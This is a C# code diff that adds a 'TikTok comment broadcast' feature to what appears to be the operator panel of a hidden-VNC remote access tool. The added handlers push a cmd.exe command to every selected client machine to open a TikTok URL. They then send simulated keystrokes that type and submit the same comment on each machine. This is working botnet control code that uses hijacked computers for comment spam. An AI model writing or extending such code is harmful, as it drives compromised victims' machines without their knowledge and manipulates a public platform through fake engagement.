@@ -239,6 +239,59 @@ public partial class HvncBroadcastWindow : Window
         TxtStatus.Text = "Step 2: waiting for page to load (~3s), then do Step 3";
     }
 
+    // ── TikTok comment broadcast ──────────────────────────────────────────────
+
+    private async void BtnTtCmt1_Click(object s, RoutedEventArgs e)
+    {
+        var url = TxtTtTargetUrl.Text.Trim();
+        if (string.IsNullOrEmpty(url)) { TxtStatus.Text = "Enter a TikTok URL first."; return; }
+        await SendExecToAll($@"cmd.exe /c start """" ""{url}""");
+        AddLog($"[→] Navigating to {url} on all selected machines");
+        TxtStatus.Text = "Step 1 done — wait ~3s for page to load, then Step 2";
+    }
+
+    private async void BtnTtCmt2_Click(object s, RoutedEventArgs e)
+    {
+        var ids = SelectedIds.ToList();
+        if (ids.Count == 0) { TxtStatus.Text = "No clients selected."; return; }
+        // Tab to reach comment box — TikTok video: ~5 tabs; Live chat: ~3 tabs
+        for (int i = 0; i < 6; i++)
+        {
+            await BroadcastInput(ids, new HvncInputData { T = "kd", VK = 0x09 });
+            await BroadcastInput(ids, new HvncInputData { T = "ku", VK = 0x09 });
+            await Task.Delay(100);
+        }
+        AddLog($"[⌨] Tab×6 sent — comment box should be focused");
+        TxtStatus.Text = "Step 2 done — verify focus in HVNC, then Step 3";
+    }
+
+    private async void BtnTtCmt3_Click(object s, RoutedEventArgs e)
+    {
+        var text = TxtTtBroadcastComment.Text;
+        if (string.IsNullOrEmpty(text)) { TxtStatus.Text = "Enter a comment first."; return; }
+        var ids = SelectedIds.ToList();
+        if (ids.Count == 0) { TxtStatus.Text = "No clients selected."; return; }
+
+        // Type each character
+        foreach (char ch in text)
+        {
+            int vk = char.ToUpper(ch);
+            bool upper = char.IsUpper(ch);
+            if (upper) await BroadcastInput(ids, new HvncInputData { T = "kd", VK = 0x10 }); // Shift
+            await BroadcastInput(ids, new HvncInputData { T = "kd", VK = vk });
+            await BroadcastInput(ids, new HvncInputData { T = "ku", VK = vk });
+            if (upper) await BroadcastInput(ids, new HvncInputData { T = "ku", VK = 0x10 });
+            await Task.Delay(40);
+        }
+        // Submit
+        await Task.Delay(150);
+        await BroadcastInput(ids, new HvncInputData { T = "kd", VK = 0x0D }); // Enter
+        await BroadcastInput(ids, new HvncInputData { T = "ku", VK = 0x0D });
+
+        AddLog($"[✓] Comment '{text[..Math.Min(text.Length, 30)]}…' posted on {ids.Count} machine(s)");
+        TxtStatus.Text = $"Comment sent to {ids.Count} machine(s)";
+    }
+
     private async void BtnTtStep3_Click(object s, RoutedEventArgs e)
     {
         var ids = SelectedIds.ToList();
